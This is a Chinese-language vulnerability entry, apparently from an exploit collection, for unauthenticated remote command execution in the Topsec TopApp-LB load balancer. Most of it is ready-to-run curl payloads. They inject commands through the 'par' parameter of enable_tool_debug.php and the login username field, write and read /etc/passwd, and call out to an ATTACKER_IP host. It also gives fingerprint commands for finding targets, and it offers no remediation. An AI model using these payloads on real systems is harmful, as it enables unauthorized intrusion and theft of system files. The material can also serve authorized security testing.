---
id: TOPSEC-TOPAPP-RCE
title: 天融信 TopApp-LB 负载均衡系统远程命令执行漏洞
product: topsec
vendor: 天融信
version_affected: "TopApp-LB 负载均衡系统"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["天融信", "TopApp-LB", "TopSec", "负载均衡"]
---

## 漏洞描述

天融信 TopApp-LB 负载均衡系统的 `enable_tool_debug.php` 接口存在命令注入漏洞。`par` 参数直接拼接到 `exec('ping '.$par)` 中执行，攻击者可通过管道符注入任意命令。同时登录页面的用户名字段也存在命令注入。

## 影响版本

- 天融信 TopApp-LB 负载均衡系统

## 前置条件

- 无需认证
- 管理界面可访问

## 利用步骤

1. 访问 `enable_tool_debug.php` 接口
2. 设置 `val=0&tool=1` 触发 ping 命令
3. 在 `par` 参数中通过管道符注入命令

## Payload

### 方式一：enable_tool_debug.php 命令注入

```bash
# 写入文件验证
curl -s "http://target/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1'+|+id+>+../../test.txt+|+'"

# 读取结果
curl -s "http://target/test.txt"
```

### 读取 /etc/passwd

```bash
curl -s "http://target/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1'+|+cat+/etc/passwd+>+../../passwd.txt+|+'"
curl -s "http://target/passwd.txt"
```

### DNS 回调验证

```bash
curl -s "http://target/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1'+|+curl+http://ATTACKER_IP/callback+|+'"
```

### 方式二：登录页面用户名命令注入

```bash
# 盲注命令执行
curl -s "http://target/login" \
  -d 'username=1;ping+ATTACKER_IP;echo&password=test'
```

## 验证方法

```bash
# 写入文件后读取
curl -s "http://target/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1'+|+id+>+../../rce_test.txt+|+'"
curl -s "http://target/rce_test.txt" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "TopApp-LB\|天融信\|TopSec\|负载均衡"
```
